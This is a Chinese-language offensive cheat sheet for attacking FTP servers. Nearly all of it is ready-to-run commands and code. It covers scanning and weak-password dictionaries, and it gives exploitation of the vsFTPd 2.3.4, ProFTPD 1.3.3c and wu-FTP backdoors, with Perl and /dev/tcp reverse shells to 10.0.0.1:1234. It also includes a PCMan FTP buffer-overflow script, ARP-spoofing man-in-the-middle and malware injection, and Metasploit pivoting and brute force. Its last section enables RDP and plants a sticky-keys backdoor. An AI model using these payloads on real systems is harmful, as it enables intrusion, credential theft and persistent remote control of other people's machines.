# FTP服务

## 弱口令

自动化匿名扫描
```bash
nmap --script ftp-* -p 21 IP地址
```

弱口令字典

[FTP弱口令](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%9B%9B%E7%AB%A0/FTP/%E5%BC%B1%E5%8F%A3%E4%BB%A4.txt)

## FTP后门

1.vsFTPd 2.3.4

user = msfadmin:)

pass = 任意

```bash
nc [IP地址] 6200
```

使用Metasploit
```bash
exploit/unix/ftp/vsftpd_234_backdoor
```

2.ProFTPD 1.3.3c

向FTP服务器发送以下命令
```bash
SITE CPFR /etc/lib/tmp/<shell_code>
```

替换shell_code为想要在目标上执行的shell代码，如建立反向shell
```bash
SITE CPFR /etc/lib/tmp/`perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,pack("ScA*",2,inet_aton($i),$p))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
```

这将执行一个Perl脚本，建立与10.0.0.1:1234的反向shell连接

发送命令执行shell代码
```bash
SITE CPWD /etc/lib/tmp
```

3.wu-FTP 2.6.2

向FTP服务器发送以下命令触发后门
```bash
DEBUG
```

发送以下命令来执行shell
```bash
SITE exec <command>
```

生成反向shell
```bash
SITE exec /bin/sh -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

## 缓冲区溢出

PCMan's FTP Server 2.0.0

exp.py
```python
import socket

# 目标FTP服务器的IP地址和端口号
target_ip = "192.168.1.100"
target_port = 21

# 创建一个socket连接到FTP服务器
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_ip, target_port))

# 接收FTP服务器的欢迎消息
response = client.recv(1024)
print(response)

# 构造溢出攻击的payload
# 这里的'A' * 2003 是用来填充缓冲区直到达到EIP的位置
# 'B' * 4 是用来覆盖EIP的值，这个值应该是一个jmp esp的地址
# 'C' * (2500-2003-4) 是用来填充剩余的缓冲区
# 实际利用时，'B' * 4 部分应替换为jmp esp的地址，后面跟上shellcode
buffer = "A" * 2003 + "B" * 4 + "C" * (2500-2003-4)

# 发送构造的溢出攻击payload
client.send("USER " + buffer + "\r\n")
response = client.recv(1024)
print(response)

# 关闭连接
client.close()
```

## 中间人

1.欺骗证书验证

ARP欺骗
```bash
arpspoof -i eth0 -t 目标IP地址 网关IP地址
```

生成伪造证书
```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

代理服务器
```bash
mitmproxy --mode transparent --ssl-insecure --certs *=server.pem
```

路由转发
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

2.纂改数据传输

ARP欺骗
```bash
arpspoof -i eth0 -t 目标IP 网关IP
```

查看FTP流量
```bash
tcpdump -i eth0 port 21
```

纂改
```bash
ettercap -T -M arp:remote /目标IP// /网关IP//
```

注入恶意文件
```bash
mitmproxy -i 8080 -r "inject /path/to/malware"
```

3.密码窃取

ARP欺骗
```bash
arpspoof -i eth0 -t 192.168.8.124 192.168.8.1
```

## FTP反弹

```bash
PORT 172,32,80,80,0,8080
EPRT |2|172.32.80.80|8080|
```

使用LIST或RETR /file/in/ftp（仅21端口）检测响应

## FTP隧道

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -L 本地端口:FTP服务器地址:FTP端口 SSH用户@SSH服务器地址
```

## FTP枢轴

```bash
ifconfig
出现两个网络接口
192.168.18.1
192.168.8.1
```

添加默认路由
```bash
use post/multi/manage/autoroute
set session 1
exploit
```

扫描系统内部网络主机
```bash
use post/multi/gather/ping_sweep
set rhosts 192.168.8.1/24
exploit
```

扫描开放端口
```bash
use auxiliary/scanner/portscan/tcp
set ports 21
set rhosts 192.168.8.165
set threads 10
exploit
```

暴力破解获取FTP用户名密码
```bash
use auxiliary/scanner/ftp/ftp_login
set rhosts 192.168.8.165
set user_file /root/user.txt
set pass_file /root/pass.txt
set stop_on_success true
exploit
```

开启RDP
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

发起粘滞键攻击
```bash
use post/windows/manage/sticky_keys
set session 1
exploit
```

另起终端连接
```bash
rdesktop 192.168.8.166

键入五次Shift打开命令提示符
start iexplore.exe
ftp://192.168.8.156
填写FTP凭据
```
